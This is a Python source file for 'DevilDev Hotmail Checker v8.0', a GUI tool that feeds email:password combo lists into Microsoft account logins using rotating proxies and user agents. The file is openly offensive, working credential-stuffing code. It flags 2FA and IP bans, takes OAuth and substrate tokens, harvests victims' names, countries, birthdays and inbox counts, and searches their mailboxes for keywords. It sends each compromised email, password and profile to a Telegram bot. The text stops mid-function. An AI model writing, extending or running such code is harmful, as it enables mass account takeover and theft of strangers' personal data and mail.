# ============================================================
# DevilDev Hotmail Checker v8.0
# ============================================================
# Yazar   : DevilDev
# Sürüm   : 8.0
# Değişiklikler:
#   - Async/aiohttp mimarisi (threading → asyncio + aiohttp)
#   - Gelişmiş proxy yönetimi (kara liste, SOCKS5, istatistik)
#   - Dinamik login (PPFT dinamik parse, UA rotasyonu)
#   - Duplicate kontrolü, JSON/Excel/CSV export
#   - Profil bilgisi hits dosyasına yazılıyor
#   - GUI: detay paneli, pencere boyutu kaydetme, grafik fix
#   - Güvenlik: pickle→json checkpoint, hata loglama, log thread-safe
# ============================================================

import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import customtkinter as ctk
import threading
import asyncio
import queue
import time
import random
import urllib.parse
import re
import json
import os
import csv
import sys
from pathlib import Path
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler

# --- aiohttp (async HTTP) ---
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    import requests  # fallback

# --- aiohttp SOCKS5 desteği ---
try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# --- Excel export ---
try:
    import openpyxl
    from openpyxl.styles import Font, PatternFill, Alignment
    HAS_OPENPYXL = True
except ImportError:
    HAS_OPENPYXL = False

# --- Grafik ---
import matplotlib
matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# --- Sistem Tepsisi ---
try:
    import pystray
    from PIL import Image, ImageDraw
    HAS_TRAY = True
except Exception:
    HAS_TRAY = False

# --- Ses ---
try:
    import winsound
    SOUNDS = {
        "beep": lambda: winsound.Beep(1000, 300),
        "ding": lambda: winsound.Beep(1500, 200),
        "buzz": lambda: winsound.Beep(500, 500),
        "silent": lambda: None
    }
except Exception:
    def _no_sound(): pass
    SOUNDS = {"beep": _no_sound, "ding": _no_sound, "buzz": _no_sound, "silent": _no_sound}

# --- Bildirim ---
try:
    from win10toast import ToastNotifier
    HAS_TOAST = True
except Exception:
    HAS_TOAST = False

# ============================================================
# User-Agent Listesi (rotasyon için)
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 Chrome/96.0.4664.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro) AppleWebKit/537.36 Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 Chrome/108.0.0.0 Safari/537.36",
]

def get_random_ua() -> str:
    return random.choice(USER_AGENTS)

# ============================================================
# Dil Sözlüğü
# ============================================================
LANGUAGES = {
    "tr": {
        "title": "DevilDev Mail Analizörü v8.0",
        "combo_label": "Combo Dosyası:",
        "keyword_label": "Keyword Dosyası:",
        "proxy_list_label": "Proxy Listesi (opsiyonel):",
        "threads_label": "Eş Zamanlı:",
        "checkpoint_interval_label": "Checkpoint Aralığı:",
        "retry_label": "Max Retry:",
        "telegram_token": "Telegram Token:",
        "telegram_chat": "Chat ID:",
        "start_btn": "███████ BAŞLAT ███████",
        "stop_btn": "DURDUR",
        "export_btn": "📊 Dışa Aktar",
        "hit": "HIT", "free": "FREE", "bad": "BAD", "retry": "RETRY",
        "total": "TOPLAM", "cpm": "CPM", "success_rate": "BAŞARI %",
        "status": "DURUM", "ready": "HAZIR", "running": "ÇALIŞIYOR",
        "filter_all": "Tümü",
        "results_table": "📋 Sonuçlar",
        "live_log": "🛡 CANLI LOG",
        "clear": "Temizle",
        "speed": "Hız:", "eta": "Kalan:", "progress": "%",
        "copy_email": "Email'i Kopyala",
        "copy_password": "Şifreyi Kopyala",
        "copy_row": "Tüm Satırı Kopyala",
        "delete_row": "Sil",
        "combo_editor": "Combo Düzenleyici",
        "add_combo": "Ekle", "remove_combo": "Sil",
        "theme_selector": "Tema Seç", "language_selector": "Dil",
        "sound_label": "Ses:", "filter_regex": "Regex Filtre:",
        "filter_placeholder": ".*@gmail.com",
        "log_to_file": "Log dosyasına kaydet",
        "search_placeholder": "Email ara...",
        "tray_show": "Göster", "tray_hide": "Gizle", "tray_exit": "Çıkış",
        "checkpoint_label": "Checkpoint",
        "proxy_stats": "Proxy İstatistikleri",
        "dead_proxies": "Ölü Proxy:",
        "active_proxies": "Aktif Proxy:",
        "detail_panel": "📌 Detaylar",
        "duplicate_skip": "Duplicate atlandı",
    },
    "en": {
        "title": "DevilDev Mail Analyzer v8.0",
        "combo_label": "Combo File:",
        "keyword_label": "Keyword File:",
        "proxy_list_label": "Proxy List (optional):",
        "threads_label": "Concurrent:",
        "checkpoint_interval_label": "Checkpoint Interval:",
        "retry_label": "Max Retry:",
        "telegram_token": "Telegram Token:",
        "telegram_chat": "Chat ID:",
        "start_btn": "███████ START ███████",
        "stop_btn": "STOP",
        "export_btn": "📊 Export",
        "hit": "HIT", "free": "FREE", "bad": "BAD", "retry": "RETRY",
        "total": "TOTAL", "cpm": "CPM", "success_rate": "SUCCESS %",
        "status": "STATUS", "ready": "READY", "running": "RUNNING",
        "filter_all": "All",
        "results_table": "📋 Results",
        "live_log": "🛡 LIVE LOG",
        "clear": "Clear",
        "speed": "Speed:", "eta": "ETA:", "progress": "%",
        "copy_email": "Copy Email",
        "copy_password": "Copy Password",
        "copy_row": "Copy Row",
        "delete_row": "Delete",
        "combo_editor": "Combo Editor",
        "add_combo": "Add", "remove_combo": "Remove",
        "theme_selector": "Theme Select", "language_selector": "Language",
        "sound_label": "Sound:", "filter_regex": "Regex Filter:",
        "filter_placeholder": ".*@gmail.com",
        "log_to_file": "Save log to file",
        "search_placeholder": "Search email...",
        "tray_show": "Show", "tray_hide": "Hide", "tray_exit": "Exit",
        "checkpoint_label": "Checkpoint",
        "proxy_stats": "Proxy Statistics",
        "dead_proxies": "Dead Proxy:",
        "active_proxies": "Active Proxy:",
        "detail_panel": "📌 Details",
        "duplicate_skip": "Duplicate skipped",
    }
}

# ============================================================
# Config
# ============================================================
CONFIG_FILE = "devildev_config.json"

def load_config():
    default = {
        "combo_file": "", "keyword_file": "", "proxy_file": "",
        "thread_count": 50, "tg_token": "", "tg_chat": "",
        "theme": "Dark", "sound": True, "language": "tr",
        "color_theme": "red", "tray_enabled": True,
        "sound_choice": "beep", "log_to_file": False,
        "checkpoint_enabled": True, "checkpoint_interval": 50,
        "max_retry": 3,
        "window_x": 100, "window_y": 50, "window_width": 1450, "window_height": 980,
    }
    if Path(CONFIG_FILE).exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                saved = json.load(f)
                default.update(saved)
                return default
        except Exception:
            pass
    return default

def save_config(config):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

# ============================================================
# Checkpoint (json tabanlı - pickle yerine)
# ============================================================
CHECKPOINT_FILE = "devildev_checkpoint.json"

def save_checkpoint(processed_index: int, combo_file: str, total_combos: int, hit_data: list):
    data = {
        "processed_index": processed_index,
        "combo_file": combo_file,
        "total_combos": total_combos,
        "hit_data": [list(r) for r in hit_data],
        "timestamp": time.time()
    }
    try:
        with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
    except Exception as e:
        logging.warning(f"Checkpoint kaydetme hatası: {e}")

def load_checkpoint() -> dict | None:
    if Path(CHECKPOINT_FILE).exists():
        try:
            with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logging.warning(f"Checkpoint okuma hatası: {e}")
    return None

def clear_checkpoint():
    try:
        if Path(CHECKPOINT_FILE).exists():
            Path(CHECKPOINT_FILE).unlink()
        # Eski pickle checkpoint varsa temizle
        if Path("devildev_checkpoint.pkl").exists():
            Path("devildev_checkpoint.pkl").unlink()
    except Exception:
        pass

# ============================================================
# Proxy Manager (kara liste, SOCKS5, istatistik)
# ============================================================
class ProxyManager:
    def __init__(self):
        self._lock = threading.Lock()
        self._all: list[str] = []
        self._blacklist: set[str] = set()
        self._fail_counts: dict[str, int] = {}
        self._success_counts: dict[str, int] = {}
        self.MAX_FAILS = 3  # Bu kadar başarısızdan sonra kara listeye al

    def load(self, file_path: str):
        self._all = []
        self._blacklist.clear()
        self._fail_counts.clear()
        self._success_counts.clear()
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        # Protokol yoksa http:// ekle
                        if not line.startswith(("http://", "https://", "socks5://", "socks4://")):
                            line = "http://" + line
                        self._all.append(line)
        except Exception as e:
            logging.error(f"Proxy yükleme hatası: {e}")

    def get(self) -> str | None:
        with self._lock:
            available = [p for p in self._all if p not in self._blacklist]
            if not available:
                return None
            return random.choice(available)

    def report_fail(self, proxy: str):
        if not proxy:
            return
        with self._lock:
            self._fail_counts[proxy] = self._fail_counts.get(proxy, 0) + 1
            if self._fail_counts[proxy] >= self.MAX_FAILS:
                self._blacklist.add(proxy)
                logging.info(f"Proxy kara listeye alındı: {proxy}")

    def report_success(self, proxy: str):
        if not proxy:
            return
        with self._lock:
            self._success_counts[proxy] = self._success_counts.get(proxy, 0) + 1
            # Başarılı olursa fail sayısını sıfırla
            self._fail_counts[proxy] = 0

    @property
    def total(self) -> int:
        return len(self._all)

    @property
    def dead(self) -> int:
        return len(self._blacklist)

    @property
    def active(self) -> int:
        return self.total - self.dead

    def stats_text(self) -> str:
        return f"Toplam: {self.total} | Aktif: {self.active} | Ölü: {self.dead}"

# ============================================================
# Telegram Notifier
# ============================================================
class TelegramNotifier:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{token}"

    def send_hit(self, email: str, password: str, captures: dict, matches: dict):
        try:
            profil = "\n".join(f"• {k}: {v}" for k, v in captures.items()) or "—"
            bulunan = "\n".join(
                f"✅ {kw}: {data['total']} mesaj — {data['last_msg'][:60]}"
                for kw, data in matches.items()
            ) or "—"
            mesaj = (
                f"🔱 <b>HIT BULUNDU (DevilDev v8.0)</b>\n\n"
                f"📧 <b>Email:</b> <code>{email}</code>\n"
                f"🔑 <b>Şifre:</b> <code>{password}</code>\n\n"
                f"👤 <b>Profil:</b>\n{profil}\n\n"
                f"🔎 <b>Eşleşen Keywordler:</b>\n{bulunan}\n\n"
                f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
                f"<b>🛡️ DevilDev Checker v8.0</b>"
            )
            if HAS_AIOHTTP:
                import requests as _req
            else:
                import requests as _req
            _req.post(
                f"{self.api_url}/sendMessage",
                json={"chat_id": self.chat_id, "text": mesaj,
                      "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=15
            )
        except Exception as e:
            logging.warning(f"Telegram gönderme hatası: {e}")

# ============================================================
# Özel Hata
# ============================================================
class LoginError(Exception):
    pass

# ============================================================
# Async HotmailChecker (aiohttp tabanlı)
# ============================================================
class HotmailChecker:
    def __init__(self, email: str, password: str, keywords: list = None, proxy: str = None):
        self.email = email
        self.password = password
        self.keywords = [k for k in (keywords or []) if k.strip()]
        self.proxy = proxy
        self.ua = get_random_ua()

        self.code = None
        self.refresh_token = None
        self.access_token = None
        self.substrate_token = None
        self.cid = None
        self.captures: dict = {}
        self.coid = "3d0f0eea-617a-4b9c-a747-100934dca583"

        # Cookie jar (aiohttp için)
        self.cookie_jar = aiohttp.CookieJar(unsafe=True) if HAS_AIOHTTP else None

    @staticmethod
    def url_encode(text: str) -> str:
        return urllib.parse.quote(text, safe="")

    @staticmethod
    def extract_code(text: str) -> str | None:
        m = re.search(r"[?&]code=([^&#\s\"']+)", text)
        if m:
            return urllib.parse.unquote(m.group(1))
        m = re.search(r'"code"\s*:\s*"([^"]+)"', text)
        if m:
            return m.group(1)
        return None

    def _make_connector(self):
        """Proxy tipine göre connector oluştur"""
        if not self.proxy:
            return aiohttp.TCPConnector(ssl=False, limit=0)
        if self.proxy.startswith("socks") and HAS_SOCKS:
            return ProxyConnector.from_url(self.proxy, ssl=False)
        # HTTP proxy için standart connector (proxy parametresi ile)
        return aiohttp.TCPConnector(ssl=False, limit=0)

    def _get_proxy_param(self):
        """HTTP proxy için aiohttp proxy parametresi"""
        if self.proxy and not self.proxy.startswith("socks"):
            return self.proxy
        return None

    async def _fetch_login_page(self, session: "aiohttp.ClientSession") -> tuple[str, str, str]:
        """
        Dinamik PPFT ve cookie almak için önce login sayfasını GET ile çek.
        PPFT token, ctx ve diğer gizli alanları response'dan parse et.
        """
        login_get_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=0000000048170EF2"
            "&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL"
            "&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf"
            "&response_type=code"
            f"&login_hint={self.url_encode(self.email)}"
            "&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bad8a8025"
            "&uaid=3d0f0eea617a4b9ca747100934dca583&msproxy=1&issuer=mso"
            "&tenant=consumers&ui_locales=en-US&client_info=1"
        )
        headers = {
            "User-Agent": self.ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        proxy_param = self._get_proxy_param()
        try:
            async with session.get(login_get_url, headers=headers,
                                   proxy=proxy_param, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                text = await resp.text(errors="replace")

            # PPFT
            ppft_match = re.search(r'name="PPFT"\s+id="i0327"\s+value="([^"]+)"', text)
            if not ppft_match:
                ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', text)
            ppft = ppft_match.group(1) if ppft_match else ""

            # post URL (sFTTag içinden)
            post_url_match = re.search(r'"urlPost"\s*:\s*"([^"]+)"', text)
            post_url = post_url_match.group(1) if post_url_match else (
                "https://login.live.com/ppsecure/post.srf"
                "?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0"
                "&opid=EED8E3DBCC1AAA6A&bk=1726223182"
                "&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216"
            )

            return ppft, post_url, text
        except Exception as e:
            logging.debug(f"Login sayfası GET hatası ({self.email}): {e}")
            return "", (
                "https://login.live.com/ppsecure/post.srf"
                "?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0"
                "&opid=EED8E3DBCC1AAA6A&bk=1726223182"
                "&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216"
            ), ""

    async def login(self, session: "aiohttp.ClientSession") -> bool:
        us = self.url_encode(self.email)
        ps = self.url_encode(self.password)

        # Dinamik PPFT al
        ppft, login_url, _ = await self._fetch_login_page(session)

        # PPFT yoksa fallback statik değer kullan
        if not ppft:
            ppft = "-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4"

        payload = (
            "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={ppft}"
            "&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={ps}"
        )

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
            "User-Agent": self.ua,
            "X-Requested-With": "com.microsoft.office.outlook",
        }

        # Ön çerezler
        session.cookie_jar.update_cookies({
            "MSPRequ": "id=N&lt=1726223182&co=1",
            "uaid": "3d0f0eea617a4b9ca747100934dca583",
            "MUID": "354ca661609b474d9471b6de17e93df7",
        }, response_url=aiohttp.helpers.URL("https://login.live.com"))

        await asyncio.sleep(random.uniform(0.15, 0.4))

        proxy_param = self._get_proxy_param()
        async with session.post(
            login_url, data=payload, headers=headers,
            allow_redirects=True,
            proxy=proxy_param,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            text = await resp.text(errors="replace")
            url = str(resp.url)

        # Çerez string
        cookies_str = " ".join(c.key for c in session.cookie_jar)

        if "Sign in to your Microsoft account" in text:
            raise LoginError("BAD")
        if ",AC:null,urlFedConvertRename" in text:
            raise LoginError("IP BAN")
        if any(k in text for k in (
            "account.live.com/recover?mkt", "recover?mkt",
            "account.live.com/identity/confirm?mkt", "/Abuse?mkt="
        )):
            raise LoginError("2FA")

        self.code = self.extract_code(url) or self.extract_code(text)

        success = False
        if self.code:
            success = True
        elif "ANON" in cookies_str or "WLSSC" in cookies_str:
            success = True
        elif "https://login.live.com/oauth20_desktop.srf" in url:
            success = True
        elif "sSigninName" in text:
            success = True
        elif "access_token" in text or "refresh_token" in text:
            success = True
        elif "i0281" not in text and "loginfmt" not in text:
            success = True

        if not success:
            raise LoginError("BAD")

        # CID
        for c in session.cookie_jar:
            if c.key == "MSPCID":
                self.cid = c.value.upper()
                break
        return True

    async def exchange_code_for_tokens(self, session: "aiohttp.ClientSession") -> bool:
        if not self.code:
            return False
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = (
            "client_info=1&client_id=0000000048170EF2"
            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            f"&grant_type=authorization_code&code={self.code}"
            "&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": self.coid,
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Host": "login.microsoftonline.com",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32", "x-client-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }
        await asyncio.sleep(random.uniform(0.1, 0.25))
        proxy_param = self._get_proxy_param()
        try:
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_param,
                                    timeout=aiohttp.ClientTimeout(total=30)) as resp:
                j = await resp.json(content_type=None)
            self.refresh_token = j.get("refresh_token")
            self.access_token = j.get("access_token")
            return bool(self.refresh_token and self.access_token)
        except Exception as e:
            logging.debug(f"Token exchange hatası ({self.email}): {e}")
            return False

    async def refresh_substrate_token(self, session: "aiohttp.ClientSession") -> bool:
        if not self.refresh_token:
            return False
        url = "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token"
        data = (
            "client_info=1&client_id=0000000048170EF2"
            f"&refresh_token={urllib.parse.quote(self.refresh_token, safe='')}"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default"
            "&grant_type=refresh_token"
        )
        headers = {
            "Accept-Encoding": "gzip",
            "client-request-id": self.coid,
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Host": "login.microsoftonline.com",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-OS": "32", "x-client-SKU": "MSAL.xplat.android",
            "x-client-Ver": "1.1.0+ad8a8025",
        }
        await asyncio.sleep(random.uniform(0.1, 0.25))
        proxy_param = self._get_proxy_param()
        try:
            async with session.post(url, data=data, headers=headers,
                                    proxy=proxy_param,
                                    timeout=aiohttp.ClientTimeout(total=30)) as resp:
                j = await resp.json(content_type=None)
            self.substrate_token = j.get("access_token")
            return bool(self.substrate_token)
        except Exception as e:
            logging.debug(f"Substrate token hatası ({self.email}): {e}")
            return False

    async def fetch_profile(self, session: "aiohttp.ClientSession") -> bool:
        if not self.substrate_token or not self.cid:
            return False
        urls = [
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            "https://substrate.office.com/profileb2/v2.0/me/profile",
        ]
        headers = {
            "Accept-Encoding": "gzip",
            "Authorization": f"Bearer {self.substrate_token}",
            "Connection": "Keep-Alive",
            "Host": "substrate.office.com",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)",
            "X-AnchorMailbox": f"CID:{self.cid}",
            "X-ClientRequestId": self.coid,
        }
        proxy_param = self._get_proxy_param()
        for url in urls:
            await asyncio.sleep(random.uniform(0.05, 0.15))
            try:
                async with session.get(url, headers=headers,
                                       proxy=proxy_param,
                                       timeout=aiohttp.ClientTimeout(total=20)) as resp:
                    data = await resp.json(content_type=None)

                names = data.get("names", [])
                if names:
                    dn = names[0].get("displayName", "").strip()
                    if dn:
                        self.captures["Name"] = dn
                    else:
                        f = names[0].get("firstName", "").strip()
                        l = names[0].get("lastName", "").strip()
                        if f or l:
                            self.captures["Name"] = f"{f} {l}".strip()

                accounts = data.get("accounts", [])
                if accounts:
                    cc = accounts[0].get("countryCode", "").strip()
                    if cc:
                        self.captures["Country"] = cc

                for ann in data.get("anniversaries", []):
                    if str(ann.get("type", "")).lower() == "birthday":
                        day, month, year = ann.get("day",""), ann.get("month",""), ann.get("year","")
                        if day or month or year:
                            self.captures["Birthday"] = f"{day}-{month}-{year}"
                        break

                if not self.captures.get("Name"):
                    n = data.get("displayNameDefault") or data.get("displayName") or data.get("name","")
                    if n:
                        self.captures["Name"] = n
                if not self.captures.get("Country"):
                    cc = data.get("countryCode") or data.get("country") or data.get("location","")
                    if cc:
                        self.captures["Country"] = cc

                if self.captures.get("Name") or self.captures.get("Country"):
                    return True
            except Exception as e:
                logging.debug(f"Profil fetch hatası ({self.email}): {e}")
        return False

    async def get_inbox_count(self, session: "aiohttp.ClientSession") -> int:
        if not self.substrate_token:
            return 0
        url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "authorization": f"Bearer {self.substrate_token}",
            "user-agent": self.ua,
            "x-owa-sessionid": self.coid,
            "x-req-source": "Mini",
            "action": "StartupData",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
        }
        proxy_param = self._get_proxy_param()
        await asyncio.sleep(random.uniform(0.05, 0.15))
        try:
            async with session.post(url, headers=headers,
                                    proxy=proxy_param,
                                    timeout=aiohttp.ClientTimeout(total=20)) as resp:
                text = await resp.text(errors="replace")
            patterns = [
                r'DisplayName\\":\\"Inbox\\",\\"TotalCount\\":(\\d+)',
                r'DisplayName":"Inbox","TotalCount":(\d+)',
                r'"Inbox".*?"TotalCount":(\d+)',
            ]
            for pat in patterns:
                m = re.search(pat, text)
                if m:
                    total = int(m.group(1))
                    self.captures["Inbox"] = str(total)
                    return total
        except Exception as e:
            logging.debug(f"Inbox count hatası ({self.email}): {e}")
        return 0

    async def search_keyword(self, session: "aiohttp.ClientSession", keyword: str) -> dict:
        if not self.substrate_token or not self.cid:
            return {"total": 0, "last_msg": ""}
        url = "https://outlook.live.com/search/api/v2/query?n=124"
        payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [
                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                ]},
                "From": 0,
                "Query": {"QueryString": keyword},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": keyword},
                "EntityTypes": ["Event", "File"],
                "From": 0, "Size": 10, "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True, "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion","NoResultModification",
                    "NoResultFolderRefinerModification","NoRequeryModification","Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {self.substrate_token}",
            "X-AnchorMailbox": f"CID:{self.cid}",
            "Content-Type": "application/json",
        }
        proxy_param = self._get_proxy_param()
        await asyncio.sleep(random.uniform(0.05, 0.15))
        try:
            async with session.post(url, json=payload, headers=headers,
                                    proxy=proxy_param,
                                    timeout=aiohttp.ClientTimeout(total=20)) as resp:
                data = await resp.json(content_type=None)
            total = data.get("Total", 0)
            count = 0
            last_msg = ""
            try:
                entity_sets = data.get("EntitySets", [])
                if entity_sets:
                    result_sets = entity_sets[0].get("ResultSets", [])
                    if result_sets:
                        results = result_sets[0].get("Results", [])
                        count = len(results)
                        if results:
                            last_msg = (
                                results[0].get("ConversationTopic", "") or
                                results[0].get("Preview", "") or
                                results[0].get("Subject", "")
                            )
            except Exception:
                pass
            return {"total": max(total, count), "last_msg": last_msg}
        except Exception as e:
            logging.debug(f"Keyword search hatası ({self.email}/{keyword}): {e}")
            return {"total": 0, "last_msg": ""}

    async def search_keywords(self, session: "aiohttp.ClientSession") -> dict:
        matches = {}
        tasks = [self.search_keyword(session, kw) for kw in self.keywords]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for kw, res in zip(self.keywords, results):
            if isinstance(res, Exception):
                logging.debug(f"Keyword gather hatası ({kw}): {res}")
                continue
            if res["total"] > 0:
                matches[kw] = res
        return matches

    async def run(self, session: "aiohttp.ClientSession") -> tuple[str, dict, dict]:
        await self.login(session)
        if await self.exchange_code_for_tokens(session):
            await self.refresh_substrate_token(session)
            await self.fetch_profile(session)
            await self.get_inbox_count(session)
            if self.keywords:
                matches = await self.search_keywords(session)
                if matches:
                    return "HIT", self.captures, matches
                return "FREE", self.captures, {}
            return "FREE", self.captures, {}
        return "BAD", {}, {}

# ============================================================
# İstatistik
# ============================================================
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.total = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.retry = 0
        self.start_time = time.time()
        self.history: list[tuple] = []
        self.rate_history: list[tuple] = []

    def add(self, stat_type: str):
        with self._lock:
            self.total += 1
            if stat_type == "hit":
                self.hits += 1
            elif stat_type == "free":
                self.free += 1
            elif stat_type == "bad":
                self.bad += 1
            elif stat_type == "retry":
                self.retry += 1
            if self.total % 10 == 0:
                t = time.time()
                self.history.append((t, self.hits, self.free, self.bad))
                rate = (self.hits / self.total * 100) if self.total else 0
                self.rate_history.append((t, rate))

    def get_speed(self) -> float:
        elapsed = time.time() - self.start_time
        return (self.total / elapsed) if elapsed > 0 else 0.0

# ============================================================
# Log Yönetimi
# ============================================================
class RotatingLogger:
    def __init__(self, log_file="devildev_log.txt", max_bytes=5*1024*1024, backup_count=3):
        self.log_file = log_file
        self.max_bytes = max_bytes
        self.backup_count = backup_count
        self._lock = threading.Lock()

    def write(self, message: str):
        with self._lock:
            try:
                if Path(self.log_file).exists() and Path(self.log_file).stat().st_size >= self.max_bytes:
                    self._rotate()
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(message + "\n")
            except Exception as e:
                logging.warning(f"Log yazma hatası: {e}")

    def _rotate(self):
        for i in range(self.backup_count - 1, 0, -1):
            src = Path(f"{self.log_file}.{i}")
            dst = Path(f"{self.log_file}.{i+1}")
            if src.exists():
                src.rename(dst)
        if Path(self.log_file).exists():
            Path(self.log_file).rename(f"{self.log_file}.1")
        Path(self.log_file).touch()

# ============================================================
# Export Yardımcıları
# ============================================================
def export_csv(hit_data: list, filename: str):
    with open(filename, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Tip", "Email", "Şifre", "Eşleşen Keyword", "Ad", "Ülke", "Doğum", "Inbox"])
        writer.writerows(hit_data)

def export_json(hit_data: list, filename: str):
    keys = ["type", "email", "password", "keyword_match", "name", "country", "birthday", "inbox"]
    records = []
    for row in hit_data:
        # row uzunluğuna göre güvenli zip
        rec = {}
        for i, k in enumerate(keys):
            rec[k] = row[i] if i < len(row) else ""
        records.append(rec)
    with open(filename, "w", encoding="utf-8") as f:
